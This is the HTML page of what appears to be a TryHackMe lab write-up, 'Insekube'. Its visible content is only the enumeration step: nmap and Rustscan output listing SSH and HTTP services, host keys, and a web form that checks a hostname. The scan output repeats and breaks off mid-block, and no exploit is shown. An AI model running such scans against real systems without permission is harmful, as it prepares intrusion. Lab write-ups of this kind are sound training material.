@@ -1,0 +1,666 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="nair0lf32 ">
+<meta name="description" content="Enumeration Rustscan &#43; nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 9f:ae:04:9e:f0:75:ed:b7:39:80:a0:d8:7f:bd:61:06 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpKksU81PRNTKP1wxKXB9jq0Yk6id6JCuj4gYTAPk932sjBdUV4OhoMBP1m2cITHGWBWiE02KzRSkgL9X0FZL6CJRxo09N2uHXp6XT5&#43;V&#43;VMf1/5B1xgETNdpqgltDpqYudiKpNQzRpkvvtvCntDr&#43;R0/4LWi7CsmII2wYFSnZ8/8UtueRCGue3Mn9oeUp1R&#43;m5yODXfJHgcHmvHsdbx1JX/7dzwI8QSFNhnXcQwRFkRcNJBmYjlMq1SvqXQMzgR70dIv/9zfFIROPyjfLkeGsmLBEflsPmLo8Nt5CxQzUzx5w/PcnRsTv&#43;X6syJXGjS6pD82hgPH/AtZGaNePAvcQjNPzYF2ZWB6WcMWJROMqeWYasava17FZOyEqteIsW0/JeXIZroSJT792OaGH/8nwqkLNmLE2Ab54GjunAeZEdb3MB2qeQ6iszeBCutm&#43;CZr9HI4aRTgmfdCIRPuJJxqQeSCpLb0kNdvt36OFCmTpMMdaj9WSaFbl7Ywvd0WIVn0= | 256 cf:cb:89:62:99:11:d7:ca:cd:5b:57:78:10:d0:6c:82 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDJH2hRXWCeM4AC7WvCY/PpWUXdSiNB&#43;E05tW7LGCL0R6WTJLTCKpmKMWdaf3PbDMgPJlR9GzaPhOvUBFZ0uI8U= | 256 5f:11:10:0d:7c:80:a3:fc:d1:d5:43:4e:49:f9:c8:d2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPvap&#43;hnXqIVCd8pv3lHrx6kbI2FqAazMvM3mjg2uiE4 80/tcp open http syn-ack |_http-title: Site doesn&amp;#39;t have a title (text/html; charset=utf-8). | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Date: Mon, 28 Feb 2022 16:38:06 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 1196 | Connection: close | &amp;lt;!" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/insekube/insekube/" />
+
+
+    <title>
+        
+            Insekube :: Zer0ne  — welcome friend
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://nair0lf32.github.io/zer0ne/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://nair0lf32.github.io/zer0ne/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://nair0lf32.github.io/zer0ne/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://nair0lf32.github.io/zer0ne/favicon-16x16.png">
+    <link rel="manifest" href="https://nair0lf32.github.io/zer0ne/site.webmanifest">
+    <link rel="mask-icon" href="https://nair0lf32.github.io/zer0ne/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://nair0lf32.github.io/zer0ne/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Insekube">
+<meta itemprop="description" content="Enumeration Rustscan &#43; nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 9f:ae:04:9e:f0:75:ed:b7:39:80:a0:d8:7f:bd:61:06 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpKksU81PRNTKP1wxKXB9jq0Yk6id6JCuj4gYTAPk932sjBdUV4OhoMBP1m2cITHGWBWiE02KzRSkgL9X0FZL6CJRxo09N2uHXp6XT5&#43;V&#43;VMf1/5B1xgETNdpqgltDpqYudiKpNQzRpkvvtvCntDr&#43;R0/4LWi7CsmII2wYFSnZ8/8UtueRCGue3Mn9oeUp1R&#43;m5yODXfJHgcHmvHsdbx1JX/7dzwI8QSFNhnXcQwRFkRcNJBmYjlMq1SvqXQMzgR70dIv/9zfFIROPyjfLkeGsmLBEflsPmLo8Nt5CxQzUzx5w/PcnRsTv&#43;X6syJXGjS6pD82hgPH/AtZGaNePAvcQjNPzYF2ZWB6WcMWJROMqeWYasava17FZOyEqteIsW0/JeXIZroSJT792OaGH/8nwqkLNmLE2Ab54GjunAeZEdb3MB2qeQ6iszeBCutm&#43;CZr9HI4aRTgmfdCIRPuJJxqQeSCpLb0kNdvt36OFCmTpMMdaj9WSaFbl7Ywvd0WIVn0= | 256 cf:cb:89:62:99:11:d7:ca:cd:5b:57:78:10:d0:6c:82 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDJH2hRXWCeM4AC7WvCY/PpWUXdSiNB&#43;E05tW7LGCL0R6WTJLTCKpmKMWdaf3PbDMgPJlR9GzaPhOvUBFZ0uI8U= | 256 5f:11:10:0d:7c:80:a3:fc:d1:d5:43:4e:49:f9:c8:d2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPvap&#43;hnXqIVCd8pv3lHrx6kbI2FqAazMvM3mjg2uiE4 80/tcp open http syn-ack |_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8). | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Date: Mon, 28 Feb 2022 16:38:06 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 1196 | Connection: close | &lt;!"><meta itemprop="datePublished" content="2022-09-20T16:00:31+01:00" />
+<meta itemprop="dateModified" content="2022-09-20T16:00:31+01:00" />
+<meta itemprop="wordCount" content="1449"><meta itemprop="image" content="https://nair0lf32.github.io/zer0ne"/>
+<meta itemprop="keywords" content="" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://nair0lf32.github.io/zer0ne"/>
+
+<meta name="twitter:title" content="Insekube"/>
+<meta name="twitter:description" content="Enumeration Rustscan &#43; nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 9f:ae:04:9e:f0:75:ed:b7:39:80:a0:d8:7f:bd:61:06 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpKksU81PRNTKP1wxKXB9jq0Yk6id6JCuj4gYTAPk932sjBdUV4OhoMBP1m2cITHGWBWiE02KzRSkgL9X0FZL6CJRxo09N2uHXp6XT5&#43;V&#43;VMf1/5B1xgETNdpqgltDpqYudiKpNQzRpkvvtvCntDr&#43;R0/4LWi7CsmII2wYFSnZ8/8UtueRCGue3Mn9oeUp1R&#43;m5yODXfJHgcHmvHsdbx1JX/7dzwI8QSFNhnXcQwRFkRcNJBmYjlMq1SvqXQMzgR70dIv/9zfFIROPyjfLkeGsmLBEflsPmLo8Nt5CxQzUzx5w/PcnRsTv&#43;X6syJXGjS6pD82hgPH/AtZGaNePAvcQjNPzYF2ZWB6WcMWJROMqeWYasava17FZOyEqteIsW0/JeXIZroSJT792OaGH/8nwqkLNmLE2Ab54GjunAeZEdb3MB2qeQ6iszeBCutm&#43;CZr9HI4aRTgmfdCIRPuJJxqQeSCpLb0kNdvt36OFCmTpMMdaj9WSaFbl7Ywvd0WIVn0= | 256 cf:cb:89:62:99:11:d7:ca:cd:5b:57:78:10:d0:6c:82 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDJH2hRXWCeM4AC7WvCY/PpWUXdSiNB&#43;E05tW7LGCL0R6WTJLTCKpmKMWdaf3PbDMgPJlR9GzaPhOvUBFZ0uI8U= | 256 5f:11:10:0d:7c:80:a3:fc:d1:d5:43:4e:49:f9:c8:d2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPvap&#43;hnXqIVCd8pv3lHrx6kbI2FqAazMvM3mjg2uiE4 80/tcp open http syn-ack |_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8). | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Date: Mon, 28 Feb 2022 16:38:06 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 1196 | Connection: close | &lt;!"/>
+
+
+
+    <meta property="og:title" content="Insekube" />
+<meta property="og:description" content="Enumeration Rustscan &#43; nmap PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 9f:ae:04:9e:f0:75:ed:b7:39:80:a0:d8:7f:bd:61:06 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpKksU81PRNTKP1wxKXB9jq0Yk6id6JCuj4gYTAPk932sjBdUV4OhoMBP1m2cITHGWBWiE02KzRSkgL9X0FZL6CJRxo09N2uHXp6XT5&#43;V&#43;VMf1/5B1xgETNdpqgltDpqYudiKpNQzRpkvvtvCntDr&#43;R0/4LWi7CsmII2wYFSnZ8/8UtueRCGue3Mn9oeUp1R&#43;m5yODXfJHgcHmvHsdbx1JX/7dzwI8QSFNhnXcQwRFkRcNJBmYjlMq1SvqXQMzgR70dIv/9zfFIROPyjfLkeGsmLBEflsPmLo8Nt5CxQzUzx5w/PcnRsTv&#43;X6syJXGjS6pD82hgPH/AtZGaNePAvcQjNPzYF2ZWB6WcMWJROMqeWYasava17FZOyEqteIsW0/JeXIZroSJT792OaGH/8nwqkLNmLE2Ab54GjunAeZEdb3MB2qeQ6iszeBCutm&#43;CZr9HI4aRTgmfdCIRPuJJxqQeSCpLb0kNdvt36OFCmTpMMdaj9WSaFbl7Ywvd0WIVn0= | 256 cf:cb:89:62:99:11:d7:ca:cd:5b:57:78:10:d0:6c:82 (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDJH2hRXWCeM4AC7WvCY/PpWUXdSiNB&#43;E05tW7LGCL0R6WTJLTCKpmKMWdaf3PbDMgPJlR9GzaPhOvUBFZ0uI8U= | 256 5f:11:10:0d:7c:80:a3:fc:d1:d5:43:4e:49:f9:c8:d2 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPvap&#43;hnXqIVCd8pv3lHrx6kbI2FqAazMvM3mjg2uiE4 80/tcp open http syn-ack |_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8). | fingerprint-strings: | GetRequest: | HTTP/1.1 200 OK | Date: Mon, 28 Feb 2022 16:38:06 GMT | Content-Type: text/html; charset=utf-8 | Content-Length: 1196 | Connection: close | &lt;!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/insekube/insekube/" /><meta property="og:image" content="https://nair0lf32.github.io/zer0ne"/><meta property="article:section" content="writeups" />
+<meta property="article:published_time" content="2022-09-20T16:00:31+01:00" />
+<meta property="article:modified_time" content="2022-09-20T16:00:31+01:00" /><meta property="og:site_name" content="Zer0ne" />
+
+
+
+
+    <meta property="article:section" content="TryHackMe" />
+
+
+
+    <meta property="article:published_time" content="2022-09-20 16:00:31 &#43;0100 WAT" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://nair0lf32.github.io/zer0ne/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">Zer0ne #</span>
+            <span class="logo__cursor" style=
+                  "
+                   background-color:#0FF00D;
+                   animation-duration:2s;">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://nair0lf32.github.io/zer0ne/about">About</a></li><li><a href="https://nair0lf32.github.io/zer0ne/posts">Blog</a></li><li><a href="https://nair0lf32.github.io/zer0ne/writeups">Writeups</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+    <main class="post">
+
+        <div class="post-info">
+            
+            </p>
+        </div>
+
+        <article>
+            <h2 class="post-title"><a href="https://nair0lf32.github.io/zer0ne/writeups/tryhackme/insekube/insekube/">Insekube</a></h2>
+
+            
+            
+            
+
+            <div class="post-content">
+                <!-- raw HTML omitted -->
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="rustscan--nmap">Rustscan + nmap</h3>
+<pre tabindex="0"><code>PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 9f:ae:04:9e:f0:75:ed:b7:39:80:a0:d8:7f:bd:61:06 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpKksU81PRNTKP1wxKXB9jq0Yk6id6JCuj4gYTAPk932sjBdUV4OhoMBP1m2cITHGWBWiE02KzRSkgL9X0FZL6CJRxo09N2uHXp6XT5+V+VMf1/5B1xgETNdpqgltDpqYudiKpNQzRpkvvtvCntDr+R0/4LWi7CsmII2wYFSnZ8/8UtueRCGue3Mn9oeUp1R+m5yODXfJHgcHmvHsdbx1JX/7dzwI8QSFNhnXcQwRFkRcNJBmYjlMq1SvqXQMzgR70dIv/9zfFIROPyjfLkeGsmLBEflsPmLo8Nt5CxQzUzx5w/PcnRsTv+X6syJXGjS6pD82hgPH/AtZGaNePAvcQjNPzYF2ZWB6WcMWJROMqeWYasava17FZOyEqteIsW0/JeXIZroSJT792OaGH/8nwqkLNmLE2Ab54GjunAeZEdb3MB2qeQ6iszeBCutm+CZr9HI4aRTgmfdCIRPuJJxqQeSCpLb0kNdvt36OFCmTpMMdaj9WSaFbl7Ywvd0WIVn0=
+|   256 cf:cb:89:62:99:11:d7:ca:cd:5b:57:78:10:d0:6c:82 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDJH2hRXWCeM4AC7WvCY/PpWUXdSiNB+E05tW7LGCL0R6WTJLTCKpmKMWdaf3PbDMgPJlR9GzaPhOvUBFZ0uI8U=
+|   256 5f:11:10:0d:7c:80:a3:fc:d1:d5:43:4e:49:f9:c8:d2 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPvap+hnXqIVCd8pv3lHrx6kbI2FqAazMvM3mjg2uiE4
+80/tcp open  http    syn-ack
+|_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Mon, 28 Feb 2022 16:38:06 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 1196
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;head&gt;
+|     &lt;link rel=&#34;stylesheet&#34; href=&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&#34;
+|     integrity=&#34;sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z&#34; crossorigin=&#34;anonymous&#34;&gt;
+|     &lt;style&gt;
+|     body,
+|     html {
+|     height: 100%;
+|     &lt;/style&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;div class=&#34;container h-100&#34;&gt;
+|     &lt;div class=&#34;row mt-5&#34;&gt;
+|     &lt;div class=&#34;col-12 mb-4&#34;&gt;
+|     class=&#34;text-center&#34;&gt;Check if a website is down 
+|     &lt;/h3&gt;
+|     &lt;/div&gt;
+|     &lt;form class=&#34;col-6 mx-auto&#34; action=&#34;/&#34;&gt;
+|     &lt;div class=&#34; input-group&#34;&gt;
+|     &lt;input name=&#34;hostname&#34; value=&#34;&#34; type=&#34;text&#34; class=&#34;form-control&#34; placeholder=&#34;Hostname&#34;
+|   HTTPOptions: 
+|     HTTP/1.1 405 Method Not Allowed
+|     Date: Mon, 28 Feb 2022 16:38:06 GMT
+|     Content-Type: text/plain; charset=utf-8
+|     Content-Length: 18
+|     Allow: GET, HEAD
+|     Connection: close
+|     Method Not Allowed
+|   RTSPRequest: 
+|     HTTP/1.1 405 Method Not Allowed
+|     Date: Mon, 28 Feb 2022 16:38:07 GMT
+|     Content-Type: text/plain; charset=utf-8
+|     Content-Length: 18
+|     Allow: GET, HEAD
+|     Connection: close
+|_    Method Not Allowed
+| http-methods: 
+|_  Supported Methods: GET HEAD
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.92%I=7%D=2/28%Time=621CF9BE%P=x86_64-pc-linux-gnu%r(GetR
+SF:equest,535,&#34;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2028\x20Feb\x20202
+SF:2\x2016:38:06\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\
+SF:nContent-Length:\x201196\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20ht
+SF:ml&gt;\n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;ht
+SF:tps://stackpath\.bootstrapcdn\.com/bootstrap/4\.5\.2/css/bootstrap\.min
+SF:\.css\&#34;\n\x20\x20\x20\x20\x20\x20\x20\x20integrity=\&#34;sha384-JcKb8q3iqJ6
+SF:1gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP\+VmmDGMN5t9UJ0Z\&#34;\x20crossorigin
+SF:=\&#34;anonymous\&#34;&gt;\n\x20\x20\x20\x20&lt;style&gt;\n\x20\x20\x20\x20\x20\x20\x20\
+SF:x20body,\n\x20\x20\x20\x20\x20\x20\x20\x20html\x20{\n\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20height:\x20100%;\n\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20}\n\x20\x20\x20\x20&lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n\x20\x20\x20\x
+SF:20&lt;div\x20class=\&#34;container\x20h-100\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x
+SF:20&lt;div\x20class=\&#34;row\x20mt-5\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20&lt;div\x20class=\&#34;col-12\x20mb-4\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;h3\x20class=\&#34;text-center\&#34;&gt;Che
+SF:ck\x20if\x20a\x20website\x20is\x20down\x20\xf0\x9f\x92\xa3&lt;/h3&gt;\n\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;/div&gt;\n\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20&lt;form\x20class=\&#34;col-6\x20mx-auto\&#34;\x20actio
+SF:n=\&#34;/\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20&lt;div\x20class=\&#34;\x20input-group\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;input\x20name=\&#34;hostna
+SF:me\&#34;\x20value=\&#34;\&#34;\x20type=\&#34;text\&#34;\x20class=\&#34;form-control\&#34;\x20placeh
+SF:older=\&#34;Hostname\&#34;\n\x20\x20\x20\x20\x20\x20\x20&#34;)%r(HTTPOptions,BC,&#34;HT
+SF:TP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x20Mon,\x2028\x20Fe
+SF:b\x202022\x2016:38:06\x20GMT\r\nContent-Type:\x20text/plain;\x20charset
+SF:=utf-8\r\nContent-Length:\x2018\r\nAllow:\x20GET,\x20HEAD\r\nConnection
+SF::\x20close\r\n\r\nMethod\x20Not\x20Allowed&#34;)%r(RTSPRequest,BC,&#34;HTTP/1\.
+SF:1\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x20Mon,\x2028\x20Feb\x202
+SF:022\x2016:38:07\x20GMT\r\nContent-Type:\x20text/plain;\x20charset=utf-8
+SF:\r\nContent-Length:\x2018\r\nAllow:\x20GET,\x20HEAD\r\nConnection:\x20c
+SF:lose\r\n\r\nMethod\x20Not\x20Allowed&#34;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+PORT   STATE SERVICE REASON  VERSION
+22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 9f:ae:04:9e:f0:75:ed:b7:39:80:a0:d8:7f:bd:61:06 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCpKksU81PRNTKP1wxKXB9jq0Yk6id6JCuj4gYTAPk932sjBdUV4OhoMBP1m2cITHGWBWiE02KzRSkgL9X0FZL6CJRxo09N2uHXp6XT5+V+VMf1/5B1xgETNdpqgltDpqYudiKpNQzRpkvvtvCntDr+R0/4LWi7CsmII2wYFSnZ8/8UtueRCGue3Mn9oeUp1R+m5yODXfJHgcHmvHsdbx1JX/7dzwI8QSFNhnXcQwRFkRcNJBmYjlMq1SvqXQMzgR70dIv/9zfFIROPyjfLkeGsmLBEflsPmLo8Nt5CxQzUzx5w/PcnRsTv+X6syJXGjS6pD82hgPH/AtZGaNePAvcQjNPzYF2ZWB6WcMWJROMqeWYasava17FZOyEqteIsW0/JeXIZroSJT792OaGH/8nwqkLNmLE2Ab54GjunAeZEdb3MB2qeQ6iszeBCutm+CZr9HI4aRTgmfdCIRPuJJxqQeSCpLb0kNdvt36OFCmTpMMdaj9WSaFbl7Ywvd0WIVn0=
+|   256 cf:cb:89:62:99:11:d7:ca:cd:5b:57:78:10:d0:6c:82 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDJH2hRXWCeM4AC7WvCY/PpWUXdSiNB+E05tW7LGCL0R6WTJLTCKpmKMWdaf3PbDMgPJlR9GzaPhOvUBFZ0uI8U=
+|   256 5f:11:10:0d:7c:80:a3:fc:d1:d5:43:4e:49:f9:c8:d2 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPvap+hnXqIVCd8pv3lHrx6kbI2FqAazMvM3mjg2uiE4
+
+80/tcp open  http    syn-ack
+|_http-title: Site doesn&#39;t have a title (text/html; charset=utf-8).
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Date: Mon, 28 Feb 2022 16:38:06 GMT
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 1196
+|     Connection: close
+|     &lt;!DOCTYPE html&gt;
+|     &lt;head&gt;
+|     &lt;link rel=&#34;stylesheet&#34; href=&#34;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&#34;
+|     integrity=&#34;sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z&#34; crossorigin=&#34;anonymous&#34;&gt;
+|     &lt;style&gt;
+|     body,
+|     html {
+|     height: 100%;
+|     &lt;/style&gt;
+|     &lt;/head&gt;
+|     &lt;body&gt;
+|     &lt;div class=&#34;container h-100&#34;&gt;
+|     &lt;div class=&#34;row mt-5&#34;&gt;
+|     &lt;div class=&#34;col-12 mb-4&#34;&gt;
+|     class=&#34;text-center&#34;&gt;Check if a website is down 
+|     &lt;/h3&gt;
+|     &lt;/div&gt;
+|     &lt;form class=&#34;col-6 mx-auto&#34; action=&#34;/&#34;&gt;
+|     &lt;div class=&#34; input-group&#34;&gt;
+|     &lt;input name=&#34;hostname&#34; value=&#34;&#34; type=&#34;text&#34; class=&#34;form-control&#34; placeholder=&#34;Hostname&#34;
+|   HTTPOptions: 
+|     HTTP/1.1 405 Method Not Allowed
+|     Date: Mon, 28 Feb 2022 16:38:06 GMT
+|     Content-Type: text/plain; charset=utf-8
+|     Content-Length: 18
+|     Allow: GET, HEAD
+|     Connection: close
+|     Method Not Allowed
+|   RTSPRequest: 
+|     HTTP/1.1 405 Method Not Allowed
+|     Date: Mon, 28 Feb 2022 16:38:07 GMT
+|     Content-Type: text/plain; charset=utf-8
+|     Content-Length: 18
+|     Allow: GET, HEAD
+|     Connection: close
+|_    Method Not Allowed
+| http-methods: 
+|_  Supported Methods: GET HEAD
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port80-TCP:V=7.92%I=7%D=2/28%Time=621CF9BE%P=x86_64-pc-linux-gnu%r(GetR
+SF:equest,535,&#34;HTTP/1\.1\x20200\x20OK\r\nDate:\x20Mon,\x2028\x20Feb\x20202
+SF:2\x2016:38:06\x20GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\
+SF:nContent-Length:\x201196\r\nConnection:\x20close\r\n\r\n&lt;!DOCTYPE\x20ht
+SF:ml&gt;\n\n&lt;head&gt;\n\x20\x20\x20\x20&lt;link\x20rel=\&#34;stylesheet\&#34;\x20href=\&#34;ht
+SF:tps://stackpath\.bootstrapcdn\.com/bootstrap/4\.5\.2/css/bootstrap\.min
+SF:\.css\&#34;\n\x20\x20\x20\x20\x20\x20\x20\x20integrity=\&#34;sha384-JcKb8q3iqJ6
+SF:1gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP\+VmmDGMN5t9UJ0Z\&#34;\x20crossorigin
+SF:=\&#34;anonymous\&#34;&gt;\n\x20\x20\x20\x20&lt;style&gt;\n\x20\x20\x20\x20\x20\x20\x20\
+SF:x20body,\n\x20\x20\x20\x20\x20\x20\x20\x20html\x20{\n\x20\x20\x20\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20height:\x20100%;\n\x20\x20\x20\x20\x20\x2
+SF:0\x20\x20}\n\x20\x20\x20\x20&lt;/style&gt;\n&lt;/head&gt;\n\n&lt;body&gt;\n\x20\x20\x20\x
+SF:20&lt;div\x20class=\&#34;container\x20h-100\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x
+SF:20&lt;div\x20class=\&#34;row\x20mt-5\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20&lt;div\x20class=\&#34;col-12\x20mb-4\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;h3\x20class=\&#34;text-center\&#34;&gt;Che
+SF:ck\x20if\x20a\x20website\x20is\x20down\x20\xf0\x9f\x92\xa3&lt;/h3&gt;\n\x20\x
+SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;/div&gt;\n\x20\x20\x20\x20\x20\
+SF:x20\x20\x20\x20\x20\x20\x20&lt;form\x20class=\&#34;col-6\x20mx-auto\&#34;\x20actio
+SF:n=\&#34;/\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+SF:x20&lt;div\x20class=\&#34;\x20input-group\&#34;&gt;\n\x20\x20\x20\x20\x20\x20\x20\x20
+SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20&lt;input\x20name=\&#34;hostna
+SF:me\&#34;\x20value=\&#34;\&#34;\x20type=\&#34;text\&#34;\x20class=\&#34;form-control\&#34;\x20placeh
+SF:older=\&#34;Hostname\&#34;\n\x20\x20\x20\x20\x20\x20\x20&#34;)%r(HTTPOptions,BC,&#34;HT
+SF:TP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nDate:\x20Mon,\x2028\x20Fe
